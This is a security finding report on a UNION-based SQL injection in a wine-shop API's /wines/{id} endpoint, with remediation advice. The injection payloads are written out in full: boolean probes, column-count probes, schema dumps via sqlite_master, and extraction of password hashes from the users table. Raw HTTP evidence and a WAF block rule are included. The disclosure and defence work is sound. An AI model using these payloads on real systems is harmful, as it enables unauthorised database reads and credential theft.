# UNION-Based SQL Injection in GET /wines/{id} Path Parameter (Unauthenticated Full Database Read)

**ID:** vuln-0016
**Severity:** HIGH
**Found:** 2026-07-20 11:58:55 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /wines/{id}
**Method:** GET
**CWE:** CWE-89
**CVSS:** 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

## Description

The numeric `{id}` path segment of `GET /wines/{id}` on the TaintedPort API is interpolated directly into a raw SQLite `SELECT ... FROM wines WHERE id = <INPUT>` query with no integer cast and no parameterised binding. An unauthenticated attacker can therefore inject arbitrary SQL, and because the underlying SELECT projects 15 columns whose values are copied verbatim into the JSON `wine` object of the response, the attacker obtains a fully in-band, "one request = one row" read primitive against the entire application database. The same code pattern is present at `GET /wines/{id}/reviews`, which provides a matching numeric-context boolean oracle (visible extraction is only limited by that endpoint's response schema).

Direct testing confirms extraction of the SQLite version, the full list of application tables (`users, wines, cart_items, orders, order_items, reviews, sqlite_sequence`), and — after registering a throwaway test account — of that account's own bcrypt `password_hash` returned inside the wine-lookup JSON response. The same primitive trivially exposes every row of every table, including bcrypt password hashes and cleartext TOTP secrets for all users, order data with customer PII, and shipping addresses.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│  UNION-Based SQL Injection — GET /wines/{id}                         │
│  Target: https://api.taintedport.com   (unauthenticated)             │
└──────────────────────────────────────────────────────────────────────┘

  Attacker (no creds)                Web app (PHP 8.2)          SQLite 3.51.2
   │                                       │                          │
   │ ① GET /wines/1                        │                          │
   │──────────────────────────────────────▶│                          │
   │                                       │  SELECT … WHERE id=1     │
   │                                       │─────────────────────────▶│
   │  { "wine": { "id":1,"name":"…" }}     │◀───── row 1 ─────────────│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ② GET /wines/2 AND 5=6   (boolean)    │                          │
   │──────────────────────────────────────▶│  WHERE id=2 AND 5=6      │
   │  { "success": false }                 │─────────────────────────▶│
   │◀──────────────────────────────────────│◀── 0 rows ──             │
   │                                       │                          │
   │ ③ GET /wines/0 UNION SELECT           │                          │
   │       101,102,…,115         (probe)   │                          │
   │──────────────────────────────────────▶│  UNION SELECT 101..115   │
   │  wine.id=101, wine.name=102, …        │─────────────────────────▶│
   │  wine.created_at=115                  │◀── injected row ─────────│
   │◀──────────────────────────────────────│  (15 cols reflected)     │
   │                                       │                          │
   │ ④ GET /wines/0 UNION SELECT           │                          │
   │       1,sqlite_version(),3,…,15       │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.name = "3.51.2"                 │◀─── SQLite version ──────│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑤ GET /wines/0 UNION SELECT           │                          │
   │       1,group_concat(name),…          │                          │
   │       FROM sqlite_master              │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.name = "users,orders,           │◀── full table list ──────│
   │               order_items,reviews,…"  │                          │
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑥ POST /auth/register  (ROE: own acct)│                          │
   │──────────────────────────────────────▶│  INSERT INTO users …     │
   │  user_id=478 created                  │─────────────────────────▶│
   │◀──────────────────────────────────────│                          │
   │                                       │                          │
   │ ⑦ GET /wines/0 UNION SELECT           │                          │
   │       id,name,email,password_hash,…   │                          │
   │       FROM users                      │                          │
   │       WHERE email="validator20+…"     │                          │
   │──────────────────────────────────────▶│──────────────────────────▶│
   │  wine.type = "$2y$10$hjYb75P1qoRG…"   │◀── bcrypt hash ──────────│
   │◀──────────────────────────────────────│                          │
   │  ▶ ARBITRARY READ of the users        │                          │
   │    table (password_hash, totp_secret, │                          │
   │    is_admin, etc.) confirmed          │                          │
   │                                       │                          │

Root cause
──────────
  $id (path param) is interpolated raw into SQL:
     SELECT * FROM wines WHERE id = <INPUT>
  No (int) cast · no prepared statement · no router-level regex.

Prerequisites
─────────────
  • Network access to api.taintedport.com (port 443).
  • None else — no credentials, no user interaction, no chaining.

Blast radius (same primitive)
─────────────────────────────
  • Dump every user's bcrypt hash        → offline password cracking
  • Dump every user's totp_secret        → permanent 2FA bypass
  • Dump orders/order_items              → customer PII, addresses
  • Dump reviews / cart_items / secrets  → full DB read
  • Chain with POST /auth/login SQLi     → instant admin JWT
```

## Impact

A network attacker with no credentials and no user interaction can read arbitrary rows from any table in the application database via a single GET request. Concretely, the following are exposed:

- `users.password_hash` — bcrypt hashes for every user; enables offline cracking of every account, including administrative accounts.
- `users.totp_secret` — stored in cleartext, permanently bypassing any 2FA protection once dumped.
- `users.email`, `users.name`, `users.is_admin` — full enumeration of the user population and privilege markers.
- `orders`, `order_items` — customer PII, shipping addresses, phone numbers, purchase history.
- Any additional secrets stored in the SQLite database.

The read primitive is unauthenticated, in-band (no OOB channel needed), fast (one request per row), and self-describing (schema is discoverable through `sqlite_master`). Combined with the sibling `POST /auth/login` SQL injection finding, or by cracking any weak bcrypt password offline, the attacker escalates to full application takeover including the administrator role.

## Technical Analysis

Root cause: the wine-lookup handler concatenates the raw `{id}` path parameter into a SQLite query of the form `SELECT id, name, region, type, vintage, price, image_url, description, description_short, grapes, alcohol, bottle_size, producer, food_pairing, created_at FROM wines WHERE id = <INPUT>`. There is no `(int)` cast, no `preg_match('/^\d+$/', $id)` guard, and no prepared-statement binding.

The injection has three characteristics that make it maximally exploitable:

1. **Numeric context** — the input lands directly after `=`, so no quote-breaking is required. The router forwards the entire remainder of the path segment (spaces, keywords, sub-selects) to the SQL layer.
2. **In-band reflection** — the executed SELECT projects exactly 15 columns and the handler copies each column positionally into the response JSON (`id → wine.id`, `name → wine.name`, ..., `created_at → wine.created_at`). Any expression the attacker places in `UNION SELECT <15 expressions>` is therefore returned verbatim, giving one-shot arbitrary read of any value.
3. **No comment tail needed** — the injected `UNION SELECT ...` naturally consumes the remainder of the outer query; SQLite also accepts double-quoted string literals (`"users"`), so payloads do not need to break out of single quotes or terminate with `--`.

Confirmed steps (payloads mine, not the tester's):

- Boolean oracle: `GET /wines/2 AND 2=2` returns wine id=2; `GET /wines/2 AND 5=6` returns `{"success":false,"message":"Wine not found."}`.
- Column count: `GET /wines/0 UNION SELECT 101,102,...,115` returns a 200 with every integer echoed into the corresponding JSON field, proving 15 projected columns and full positional reflection.
- DBMS fingerprint: `GET /wines/0 UNION SELECT 1,sqlite_version(),3,4,...,15` returns `wine.name = "3.51.2"`.
- Schema disclosure: `GET /wines/0 UNION SELECT 1,group_concat(name),3,...,15 FROM sqlite_master WHERE type="table"` returns `"users,sqlite_sequence,wines,cart_items,orders,order_items,reviews"`.
- Row exfiltration: after registering my own throwaway account (`validator20+poc<ts>@example.com`, user_id 478), `GET /wines/0 UNION SELECT id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,...,14,created_at FROM users WHERE email="validator20+poc1784548486@example.com"` returned `wine.type = "$2y$10$hjYb75P1qoRG2fuH00REReP/A9IYngmpM.aoypnj3Y6nWNmGQlMiu"` — the real bcrypt hash of that account, dumped through a wine endpoint.

The sibling `GET /wines/{id}/reviews` handler shares the same numeric-context WHERE: `GET /wines/1 AND 2=2/reviews` returns the review list, `GET /wines/1 AND 5=6/reviews` returns an empty array. Visible UNION-based extraction there is bounded by the reviews response schema, but a boolean oracle for blind extraction is fully usable.

The backend is SQLite 3.51.2 running under PHP 8.2 as fingerprinted from prior recon.

## Proof of Concept

Prerequisites: none — the endpoint is reachable unauthenticated. All the following are single GET requests to `https://api.taintedport.com`.

1. Baseline: `GET /wines/1` → HTTP 200, real wine object.
2. Boolean oracle demonstrating numeric-context WHERE injection:
   - `GET /wines/2%20AND%202=2` → HTTP 200, wine id=2 returned.
   - `GET /wines/2%20AND%205=6` → HTTP 200, `{"success":false,"message":"Wine not found."}`.
3. Column count probe (15 projected columns):
   `GET /wines/0%20UNION%20SELECT%20101,102,103,104,105,106,107,108,109,110,111,112,113,114,115`
   → each integer is echoed into its positional JSON field.
4. DBMS fingerprint:
   `GET /wines/0%20UNION%20SELECT%201,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15`
   → `wine.name = "3.51.2"`.
5. Full schema disclosure via `sqlite_master`:
   `GET /wines/0%20UNION%20SELECT%201,group_concat(name),3,4,...,15%20FROM%20sqlite_master%20WHERE%20type=%22table%22`
   → returns the complete table list.
6. Row-level exfiltration (ROE-compliant — register a throwaway account first, then read that same account's row):
   `POST /auth/register` with a fresh email, then
   `GET /wines/0%20UNION%20SELECT%20id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,9,10,11,12,13,14,created_at%20FROM%20users%20WHERE%20email=%22<url-encoded-email>%22`
   → the response's `wine.type` field contains the real bcrypt hash of the throwaway account.

The bundled `poc/poc.py` automates all six steps with per-step assertions and prints a "VULNERABILITY CONFIRMED" banner if the bcrypt hash is successfully extracted. The bundled `poc/verify.py` is a minimal regression check that exits 0 while the vulnerability is still exploitable.

```
See poc_script_path.
```

## Evidence

### 1. Baseline — real wine row

**Request:**
```http
GET /wines/1 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"wine":{"id":1,"name":"Quinta do Vallado Douro Tinto","region":"Douro","type":"Red","vintage":2020,...}}
```

> Establishes a known-good response shape (JSON wine object with 15 fields).

### 2. Boolean oracle — TRUE

**Request:**
```http
GET /wines/2%20AND%202=2 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":2,"name":"Pêra-Manca Branco",...}}
```

> 'AND 2=2' evaluates true so the wine is still returned — the id path segment lands inside a WHERE clause.

### 3. Boolean oracle — FALSE

**Request:**
```http
GET /wines/2%20AND%205=6 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":false,"message":"Wine not found."}
```

> 'AND 5=6' evaluates false so no row matches — proves numeric-context injection into the WHERE.

### 4. Column count probe (15 numeric values)

**Request:**
```http
GET /wines/0%20UNION%20SELECT%20101,102,103,104,105,106,107,108,109,110,111,112,113,114,115 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":101,"name":102,"region":103,"type":104,"vintage":105,"price":106,"image_url":107,"description":108,"description_short":109,"grapes":110,"alcohol":111,"bottle_size":112,"producer":113,"food_pairing":114,"created_at":115}}
```

> Underlying SELECT has 15 columns, each is rendered positionally into the JSON wine object — full in-band read primitive.

### 5. DBMS fingerprint — sqlite_version()

**Request:**
```http
GET /wines/0%20UNION%20SELECT%201,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":1,"name":"3.51.2","region":3,...}}
```

> Backend confirmed as SQLite 3.51.2.

### 6. Schema disclosure — list of tables from sqlite_master

**Request:**
```http
GET /wines/0%20UNION%20SELECT%201,group_concat(name),3,4,5,6,7,8,9,10,11,12,13,14,15%20FROM%20sqlite_master%20WHERE%20type=%22table%22 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":1,"name":"users,sqlite_sequence,wines,cart_items,orders,order_items,reviews","region":3,...}}
```

> Every application table (including `users`) is discoverable — attacker can pivot to any table.

### 7. Register throwaway account (ROE — own data only)

**Request:**
```http
POST /auth/register HTTP/1.1
Host: api.taintedport.com
Content-Type: application/json

{"name":"Validator20 PoC","email":"validator20+poc1784548486@example.com","password":"TestPass!123"}
```

**Response:**
```http
HTTP/1.1 201 Created

{"success":true,"user":{"id":478,"name":"Validator20 PoC","email":"validator20+poc1784548486@example.com","is_admin":false},"token":"eyJhbGciOi..."}
```

> Fresh test user id=478 created so we can prove row-level read without touching other users' data.

### 8. Row exfiltration — own bcrypt hash via UNION SELECT on users

**Request:**
```http
GET /wines/0%20UNION%20SELECT%20id,name,email,password_hash,is_admin,totp_secret,totp_enabled,8,9,10,11,12,13,14,created_at%20FROM%20users%20WHERE%20email=%22validator20%2Bpoc1784548486%40example.com%22 HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"wine":{"id":478,"name":"Validator20 PoC","region":"validator20+poc1784548486@example.com","type":"$2y$10$hjYb75P1qoRG2fuH00REReP/A9IYngmpM.aoypnj3Y6nWNmGQlMiu","vintage":0,"price":0,"image_url":7,"description":8,...,"created_at":"2026-07-20 11:54:46"}}
```

> The real bcrypt hash of the throwaway account is returned inside the JSON wine object via the wine-lookup endpoint — arbitrary read of the `users` table is proven.

### 9. Sibling endpoint /wines/{id}/reviews — boolean oracle

**Request:**
```http
GET /wines/1%20AND%205=6/reviews HTTP/1.1
Host: api.taintedport.com
```

**Response:**
```http
HTTP/1.1 200 OK

{"success":true,"reviews":[],"avg_rating":0,"review_count":0}
```

> Compared with GET /wines/1%20AND%202=2/reviews which returns the real review list — same numeric-context SQL injection is present on this handler too.


## Remediation

1. **Integer-cast and parameterise the path parameter in the wine-lookup handler.** Both defences must be in place; the cast alone neutralises this specific attack, parameterisation is the required baseline.

```php
$id = (int) $id;
$stmt = $pdo->prepare('SELECT * FROM wines WHERE id = :id LIMIT 1');
$stmt->execute([':id' => $id]);
```

2. **Apply the identical fix to `GET /wines/{id}/reviews`** (same root cause, same numeric context).
3. **Validate every numeric path segment at the routing layer** with a regex constraint (`/^\d+$/`) so anything non-numeric returns 404 before it ever reaches the handler.
4. **Audit the whole codebase** for other raw SQL string interpolation. Enforce a repository/DAO layer that only exposes parameterised methods; ban string concatenation of user input into SQL in code review.
5. **Rotate secrets treated as compromised** — force a password reset for every user (bcrypt is unbroken but the hashes must be treated as exposed), rotate every stored `totp_secret` (they are stored in cleartext), and rotate the JWT HS256 signing key so any tokens minted via chained exploitation are invalidated.
6. **Add WAF/regression rules** — block requests to `/wines/*` containing `UNION`, `SELECT`, or ` AND ` in the path (defence in depth). Add integration tests: `GET /wines/1 AND 1=2` and `GET /wines/-1 UNION SELECT ...` must both return 404.
7. **Enable query logging in the DB and alerting** on anomalous SELECTs from the web user (e.g. queries containing `sqlite_master` or `password_hash`).

## Conditions for Severity Increase

- If any bcrypt hash extracted through this primitive is crackable offline (dictionary/weak password), the finding chains directly to full account takeover; for administrative accounts this yields Integrity:H and effectively S:C (management of the application by a formerly unauthenticated attacker).
- Because `users.totp_secret` is stored in cleartext, any account whose hash is cracked is also stripped of its 2FA protection with no additional work.
- Chained with the sibling `POST /auth/login` SQL injection finding (authentication bypass), the attacker skips password cracking entirely and mints a valid admin JWT — Integrity and Availability both rise to H.
- If the underlying SQLite database is shared with any other component (e.g. background workers) that also reads `users` or `orders`, the impact broadens to those components as well.
